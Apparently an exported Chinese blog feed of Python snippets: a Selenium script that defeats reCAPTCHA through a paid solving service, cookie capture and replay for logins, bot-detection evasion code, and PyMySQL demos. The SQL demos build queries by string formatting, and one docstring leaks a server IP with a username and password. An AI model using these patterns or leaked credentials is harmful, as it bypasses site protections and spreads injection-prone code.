class="number">200</span>:</span><br><span class="line">                data = response.json()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;response data:&#x27;</span>, data)</span><br><span class="line">                <span class="keyword">return</span> data.get(<span class="string">&#x27;data&#x27;</span>, &#123;&#125;).get(<span class="string">&#x27;taskId&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;create task failed&#x27;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">polling_task</span>(<span class="params">task_id</span>):</span></span><br><span class="line">        url2 = <span class="string">&#x27;https://api.recaptcha.press/task/status?taskId=%s&#x27;</span> % task_id</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> count &lt; <span class="number">60</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.get(url2)</span><br><span class="line">                <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                    data = response.json()</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;polling result&#x27;</span>, data)</span><br><span class="line">                    status = data.get(<span class="string">&#x27;data&#x27;</span>, &#123;&#125;).get(<span class="string">&#x27;status&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;status of task&#x27;</span>, status)</span><br><span class="line">                    <span class="keyword">if</span> status == <span class="string">&#x27;Success&#x27;</span>:</span><br><span class="line">                        <span class="keyword">return</span> data.get(<span class="string">&#x27;data&#x27;</span>, &#123;&#125;).get(<span class="string">&#x27;response&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;polling task failed&#x27;</span>, e)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;请求页面&quot;&quot;&quot;</span></span><br><span class="line">        self.driver.get(self.url)</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        self.driver.execute_script(</span><br><span class="line">            <span class="string">&quot;&quot;&quot;document.querySelector(&quot;#divStep1 &gt; div:nth-child(2) &gt; div &gt; span &gt; a&quot;).click();&quot;&quot;&quot;</span>)</span><br><span class="line">        <span class="comment"># time.sleep(3)</span></span><br><span class="line">        <span class="built_in">input</span>(<span class="string">&quot;信息填完后按回车:&quot;</span>)</span><br><span class="line">        task_id = self.create_task()</span><br><span class="line">        task_id = self.polling_task(task_id)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;task_id:&quot;</span>, task_id)</span><br><span class="line">        js_code = <span class="string">&#x27;document.getElementById(&quot;g-recaptcha-response&quot;).innerHTML=&quot;&#123;&#125;&quot;;&#x27;</span>.<span class="built_in">format</span>(task_id)</span><br><span class="line">        <span class="built_in">print</span>(js_code)</span><br><span class="line">        self.driver.execute_script(js_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    is_true = valid_date(<span class="string">&quot;2021-09-10&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> is_true:</span><br><span class="line">        st = SeleniumTest()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            st.get_data()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;测试到期!!!&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>PyMySQL创建</title>
    <url>//PyMySQL%E5%88%9B%E5%BB%BA</url>
    <content><![CDATA[<h1 id="PyMySQL-MySQL数据库-创建"><a href="#PyMySQL-MySQL数据库-创建" class="headerlink" title="PyMySQL  MySQL数据库_创建"></a>PyMySQL  MySQL数据库_创建</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;localhost&quot;</span></span><br><span class="line">user = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">pwd = <span class="string">&#x27;1234&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开数据库连接</span></span><br><span class="line">db = pymysql.connect(ip, user, pwd, <span class="string">&quot;matt&quot;</span>)</span><br><span class="line"><span class="comment"># 使用 cursor() 方法创建一个游标对象 cursor</span></span><br><span class="line">cursor = db.cursor()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 execute() 方法执行 SQL，如果表存在则删除</span></span><br><span class="line">cursor.execute(<span class="string">&quot;DROP TABLE IF EXISTS EMPLOYEE&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用预处理语句创建表</span></span><br><span class="line">sql = <span class="string">&quot;&quot;&quot;CREATE TABLE EMPLOYEE (</span></span><br><span class="line"><span class="string">         FIRST_NAME  CHAR(20) NOT NULL,</span></span><br><span class="line"><span class="string">         LAST_NAME  CHAR(20),</span></span><br><span class="line"><span class="string">         AGE INT,  </span></span><br><span class="line"><span class="string">         SEX CHAR(1),</span></span><br><span class="line"><span class="string">         INCOME FLOAT );&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cursor.execute(sql)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭数据库连接</span></span><br><span class="line">db.close()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>PyMySQL删除</title>
    <url>//PyMySQL%E5%88%A0%E9%99%A4</url>
    <content><![CDATA[<h1 id="PyMySQL-MySQL数据库-删除"><a href="#PyMySQL-MySQL数据库-删除" class="headerlink" title="PyMySQL   MySQL数据库_删除"></a>PyMySQL   MySQL数据库_删除</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1、删除操作</span></span><br><span class="line"><span class="string">删除操作用于删除数据表中的数据，以下实例演示了删除数据表 EMPLOYEE 中 AGE 大于 20 的所有数据：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2、执行事务</span></span><br><span class="line"><span class="string">事务机制可以确保数据一致性。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">事务应该具有4个属性：原子性、一致性、隔离性、持久性。这四个属性通常称为ACID特性。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    原子性（atomicity）。一个事务是一个不可分割的工作单位，事务中包括的诸操作要么都做，要么都不做。</span></span><br><span class="line"><span class="string">    一致性（consistency）。事务必须是使数据库从一个一致性状态变到另一个一致性状态。一致性与原子性是密切相关的。</span></span><br><span class="line"><span class="string">    隔离性（isolation）。一个事务的执行不能被其他事务干扰。即一个事务内部的操作及使用的数据对并发的其他事务是隔离的，并发执行的各个事务之间不能互相干扰。</span></span><br><span class="line"><span class="string">    持久性（durability）。持续性也称永久性（permanence），指一个事务一旦提交，它对数据库中数据的改变就应该是永久性的。接下来的其他操作或故障不应该对其有任何影响。</span></span><br><span class="line"><span class="string">    Python DB API 2.0 的事务提供了两个方法 commit 或 rollback。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">实例</span></span><br><span class="line"><span class="string">实例(Python 3.0+)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># SQL删除记录语句</span></span><br><span class="line"><span class="string">sql = &quot;DELETE FROM EMPLOYEE WHERE AGE &gt; %s&quot; % (20)</span></span><br><span class="line"><span class="string">try:</span></span><br><span class="line"><span class="string">   # 执行SQL语句</span></span><br><span class="line"><span class="string">   cursor.execute(sql)</span></span><br><span class="line"><span class="string">   # 向数据库提交</span></span><br><span class="line"><span class="string">   db.commit()</span></span><br><span class="line"><span class="string">except:</span></span><br><span class="line"><span class="string">   # 发生错误时回滚</span></span><br><span class="line"><span class="string">   db.rollback()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">对于支持事务的数据库， 在Python数据库编程中，当游标建立之时，就自动开始了一个隐形的数据库事务。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">commit()方法游标的所有更新操作，rollback（）方法回滚当前游标的所有操作。每一个方法都开始了一个新的事务。</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># !/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;localhost&quot;</span></span><br><span class="line">user = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">pwd = <span class="string">&#x27;1234&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开数据库连接</span></span><br><span class="line">db = pymysql.connect(ip, user, pwd, <span class="string">&quot;matt&quot;</span>)</span><br><span class="line"><span class="comment"># 使用 cursor() 方法创建一个游标对象 cursor</span></span><br><span class="line">cursor = db.cursor()</span><br><span class="line"></span><br><span class="line"><span class="comment"># SQL 删除语句</span></span><br><span class="line">sql = <span class="string">&quot;DELETE FROM EMPLOYEE WHERE AGE &gt; %s&quot;</span> % (<span class="number">20</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 执行SQL语句</span></span><br><span class="line">    cursor.execute(sql)</span><br><span class="line">    <span class="comment"># 提交修改</span></span><br><span class="line">    db.commit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="comment"># 发生错误时回滚</span></span><br><span class="line">    db.rollback()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;on NO&#x27;</span>)</span><br><span class="line"><span class="comment"># 关闭连接</span></span><br><span class="line">db.close()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>PyMySQL插入</title>
    <url>//PyMySQL%E6%8F%92%E5%85%A5</url>
    <content><![CDATA[<h1 id="PyMySQL-MySQL数据库-插入"><a href="#PyMySQL-MySQL数据库-插入" class="headerlink" title="PyMySQL   MySQL数据库_插入"></a>PyMySQL   MySQL数据库_插入</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;localhost&quot;</span></span><br><span class="line">user = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">pwd = <span class="string">&#x27;1234&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开数据库连接</span></span><br><span class="line">db = pymysql.connect(ip, user, pwd, <span class="string">&quot;matt&quot;</span>)</span><br><span class="line"><span class="comment"># 使用 cursor() 方法创建一个游标对象 cursor</span></span><br><span class="line">cursor = db.cursor()</span><br><span class="line"></span><br><span class="line"><span class="comment"># SQL 插入语句</span></span><br><span class="line">sql = <span class="string">&quot;&quot;&quot;INSERT INTO EMPLOYEE(FIRST_NAME,</span></span><br><span class="line"><span class="string">         LAST_NAME, AGE, SEX, INCOME)</span></span><br><span class="line"><span class="string">         VALUES (&#x27;Mac&#x27;, &#x27;Mohan&#x27;, 20, &#x27;M&#x27;, 2000)&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 执行sql语句</span></span><br><span class="line">    cursor.execute(sql)</span><br><span class="line">    <span class="comment"># 提交到数据库执行</span></span><br><span class="line">    db.commit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="comment"># 如果发生错误则回滚</span></span><br><span class="line">    db.rollback()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;on NO&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭数据库连接</span></span><br><span class="line">db.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">或者  ：</span></span><br><span class="line"><span class="string"># SQL 插入语句</span></span><br><span class="line"><span class="string">sql = &quot;INSERT INTO EMPLOYEE(FIRST_NAME, \</span></span><br><span class="line"><span class="string">       LAST_NAME, AGE, SEX, INCOME) \</span></span><br><span class="line"><span class="string">       VALUES (&#x27;%s&#x27;, &#x27;%s&#x27;,  %s,  &#x27;%s&#x27;,  %s)&quot; % \</span></span><br><span class="line"><span class="string">       (&#x27;Mac&#x27;, &#x27;Mohan&#x27;, 20, &#x27;M&#x27;, 2000)</span></span><br><span class="line"><span class="string">try:</span></span><br><span class="line"><span class="string">   # 执行sql语句</span></span><br><span class="line"><span class="string">   cursor.execute(sql)</span></span><br><span class="line"><span class="string">   # 执行sql语句</span></span><br><span class="line"><span class="string">   db.commit()</span></span><br><span class="line"><span class="string">except:</span></span><br><span class="line"><span class="string">   # 发生错误时回滚</span></span><br><span class="line"><span class="string">   db.rollback()</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"># 关闭数据库连接</span></span><br><span class="line"><span class="string">db.close()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>PyMySQL更新</title>
    <url>//PyMySQL%E6%9B%B4%E6%96%B0</url>
    <content><![CDATA[<h1 id="PyMySQL-MySQL数据库-更新"><a href="#PyMySQL-MySQL数据库-更新" class="headerlink" title="PyMySQL   MySQL数据库_更新"></a>PyMySQL   MySQL数据库_更新</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">数据库更新操作</span></span><br><span class="line"><span class="string">更新操作用于更新数据表的数据，以下实例将 TESTDB 表中 SEX 为 &#x27;M&#x27; 的 AGE 字段递增 1：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># !/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;localhost&quot;</span></span><br><span class="line">user = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">pwd = <span class="string">&#x27;1234&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开数据库连接</span></span><br><span class="line">db = pymysql.connect(ip, user, pwd, <span class="string">&quot;matt&quot;</span>)</span><br><span class="line"><span class="comment"># 使用 cursor() 方法创建一个游标对象 cursor</span></span><br><span class="line">cursor = db.cursor()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># SQL 更新语句</span></span><br><span class="line">sql = <span class="string">&quot;UPDATE EMPLOYEE SET AGE = AGE + 1 WHERE SEX = &#x27;%c&#x27;&quot;</span> % (<span class="string">&#x27;M&#x27;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 执行SQL语句</span></span><br><span class="line">    cursor.execute(sql)</span><br><span class="line">    <span class="comment"># 提交到数据库执行</span></span><br><span class="line">    db.commit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="comment"># 发生错误时回滚</span></span><br><span class="line">    db.rollback()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;on NO&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭数据库连接</span></span><br><span class="line">db.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>PyMySQL查询</title>
    <url>//PyMySQL%E6%9F%A5%E8%AF%A2</url>
    <content><![CDATA[<h1 id="PyMySQL-MySQL数据库-查询"><a href="#PyMySQL-MySQL数据库-查询" class="headerlink" title="PyMySQL   MySQL数据库_查询"></a>PyMySQL   MySQL数据库_查询</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">数据库查询操作</span></span><br><span class="line"><span class="string">Python查询Mysql使用 fetchone() 方法获取单条数据, 使用fetchall() 方法获取多条数据。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fetchone(): 该方法获取下一个查询结果集。结果集是一个对象</span></span><br><span class="line"><span class="string">fetchall(): 接收全部的返回结果行.</span></span><br><span class="line"><span class="string">rowcount: 这是一个只读属性，并返回执行execute()方法后影响的行数。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">实例：</span></span><br><span class="line"><span class="string">查询EMPLOYEE表中salary（工资）字段大于1000的所有数据：</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># !/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;localhost&quot;</span></span><br><span class="line">user = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">pwd = <span class="string">&#x27;1234&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开数据库连接</span></span><br><span class="line">db = pymysql.connect(ip, user, pwd, <span class="string">&quot;matt&quot;</span>)</span><br><span class="line"><span class="comment"># 使用 cursor() 方法创建一个游标对象 cursor</span></span><br><span class="line">cursor = db.cursor()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># SQL 查询语句</span></span><br><span class="line">sql = <span class="string">&quot;SELECT * FROM EMPLOYEE \</span></span><br><span class="line"><span class="string">       WHERE INCOME &gt; %s&quot;</span> % (<span class="number">1000</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 执行SQL语句</span></span><br><span class="line">    cursor.execute(sql)</span><br><span class="line">    <span class="comment"># 获取所有记录列表</span></span><br><span class="line">    results = cursor.fetchall()</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> results:</span><br><span class="line">        fname = row[<span class="number">0</span>]</span><br><span class="line">        lname = row[<span class="number">1</span>]</span><br><span class="line">        age = row[<span class="number">2</span>]</span><br><span class="line">        sex = row[<span class="number">3</span>]</span><br><span class="line">        income = row[<span class="number">4</span>]</span><br><span class="line">        <span class="comment"># 打印结果</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;fname=%s,lname=%s,age=%s,sex=%s,income=%s&quot;</span> % \</span><br><span class="line">              (fname, lname, age, sex, income))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Error: unable to fetch data&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭数据库连接</span></span><br><span class="line">db.close()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>Pymysql连接</title>
    <url>//Pymysql%E8%BF%9E%E6%8E%A5</url>
    <content><![CDATA[<h1 id="Pymysql-MySQL数据库-连接"><a href="#Pymysql-MySQL数据库-连接" class="headerlink" title="Pymysql   MySQL数据库_连接"></a>Pymysql   MySQL数据库_连接</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">一、python实现用户登陆</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1、连接、关闭（游标）</span></span><br><span class="line"><span class="string">execute():SQL注入</span></span><br><span class="line"><span class="string">101.34.178.236:matt:1230</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="comment"># ip = input(&#x27;ip:&#x27;)</span></span><br><span class="line"><span class="comment"># user = input(&#x27;username:&#x27;)</span></span><br><span class="line"><span class="comment"># pwd = input(&#x27;password:&#x27;)</span></span><br><span class="line"><span class="comment"># ip = &#x27;101.34.178.236&#x27;</span></span><br><span class="line">ip = <span class="string">&quot;localhost&quot;</span></span><br><span class="line">user = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">pwd = <span class="string">&#x27;1234&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开数据库连接</span></span><br><span class="line">db = pymysql.connect(ip, user, pwd, <span class="string">&quot;matt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 cursor() 方法创建一个游标对象 cursor</span></span><br><span class="line">cursor = db.cursor()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 execute()  方法执行 SQL 查询</span></span><br><span class="line">cursor.execute(<span class="string">&quot;show databases;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 fetchone() 方法获取单条数据.</span></span><br><span class="line">data = cursor.fetchone()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Database version : %s &quot;</span> % data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭数据库连接</span></span><br><span class="line">db.close()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>cookie-使用</title>
    <url>//cookie-%E4%BD%BF%E7%94%A8</url>
    <content><![CDATA[<h1 id="cookie-使用"><a href="#cookie-使用" class="headerlink" title="cookie-使用"></a>cookie-使用</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 使用cookie登陆</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment">#填写webdriver的保存目录</span></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line"><span class="comment"># driver.execute_cdp_cmd(&quot;Page.addScriptToEvaluateOnNewDocument&quot;, &#123;</span></span><br><span class="line"><span class="comment">#         &quot;source&quot;: &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#         Object.defineProperty(navigator, &#x27;webdriver&#x27;, &#123;</span></span><br><span class="line"><span class="comment">#           get: () =&gt; undefined</span></span><br><span class="line"><span class="comment">#         &#125;)</span></span><br><span class="line"><span class="comment">#       &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#记得写完整的url 包括http和https</span></span><br><span class="line">driver.get(<span class="string">&#x27;https://sycm.taobao.com/custom/enterprise_info&#x27;</span>)</span><br><span class="line"><span class="comment">#首先清除由于浏览器打开已有的cookies</span></span><br><span class="line">driver.delete_all_cookies()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;cookie.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> cookief:</span><br><span class="line">    <span class="comment">#使用json读取cookies 注意读取的是文件 所以用load而不是loads</span></span><br><span class="line">    cookieslist = json.load(cookief)</span><br><span class="line">    <span class="comment"># print(cookieslist)</span></span><br><span class="line">    <span class="keyword">for</span> cookie <span class="keyword">in</span> cookieslist:</span><br><span class="line">        <span class="built_in">print</span>(cookie)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;sameSite&#x27;</span> <span class="keyword">in</span> cookie:</span><br><span class="line">            <span class="keyword">del</span> cookie[<span class="string">&#x27;sameSite&#x27;</span>]</span><br><span class="line">        driver.add_cookie(cookie)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>cookie-获取</title>
    <url>//cookie-%E8%8E%B7%E5%8F%96</url>
    <content><![CDATA[<h1 id="cookie-获取"><a href="#cookie-获取" class="headerlink" title="cookie-获取"></a>cookie-获取</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 获取cookie</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#填写webdriver的保存目录</span></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line"></span><br><span class="line"><span class="comment">#记得写完整的url 包括http和https</span></span><br><span class="line">driver.get(<span class="string">&#x27;https://www.xvideos.com/?k=%E6%97%A5%E6%9C%AC%E6%97%A0%E7%A0%81&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#程序打开网页后20秒内手动登陆账户</span></span><br><span class="line">time.sleep(<span class="number">300</span>)</span><br><span class="line">cook = driver.get_cookies()</span><br><span class="line"><span class="built_in">print</span>(cook)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;xx.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> cookief:</span><br><span class="line">    <span class="comment">#将cookies保存为json格式</span></span><br><span class="line">    cookief.write(json.dumps(driver.get_cookies()))</span><br><span class="line"></span><br><span class="line">driver.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;0000000000000000000000000000000000000000000000000000&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>spider_ip代理</title>
    <url>//spider_ip%E4%BB%A3%E7%90%86</url>
    <content><![CDATA[<h1 id="spider-ip代理"><a href="#spider-ip代理" class="headerlink" title="spider_ip代理"></a>spider_ip代理</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># ip代理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip_proxy</span>():</span></span><br><span class="line">    <span class="comment"># 代理商提供的api</span></span><br><span class="line">    url = <span class="string">&quot;http://proxy.httpdaili.com/apinew.asp?sl=3&amp;noinfo=true&amp;text=1&amp;ddbh=1420927609453534893&quot;</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;代理ip状态码：&quot;</span>, r.status_code)</span><br><span class="line">    t = r.text</span><br><span class="line">    <span class="comment"># 正则匹配ip段and端口号</span></span><br><span class="line">    ips = re.findall(<span class="string">r&#x27;[0-9]+(?:\.[0-9])+.+[0-9]&#123;3&#125;&#x27;</span>, t)</span><br><span class="line">    <span class="built_in">print</span>(ips)</span><br><span class="line">    proxy = &#123;<span class="string">&#x27;http&#x27;</span>: ips[<span class="number">0</span>]&#125;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;当前代理ip地址为：&quot;</span>,proxy)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> proxy</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ip_proxy()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>map()函数应用</title>
    <url>//map()%E5%87%BD%E6%95%B0%E5%BA%94%E7%94%A8</url>
    <content><![CDATA[<h1 id="map-函数应用"><a href="#map-函数应用" class="headerlink" title="map()  函数应用"></a>map()  函数应用</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正常函数 一个参数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x ** <span class="number">2</span></span><br><span class="line"></span><br><span class="line">op = <span class="built_in">map</span>(add,[<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;map一个参数：&quot;</span>+<span class="built_in">str</span>(<span class="built_in">list</span>(op)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正常函数 两个参数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">app</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x*y ** <span class="number">2</span>  <span class="comment"># 先幂运算 再乘除加减</span></span><br><span class="line"></span><br><span class="line">oo = <span 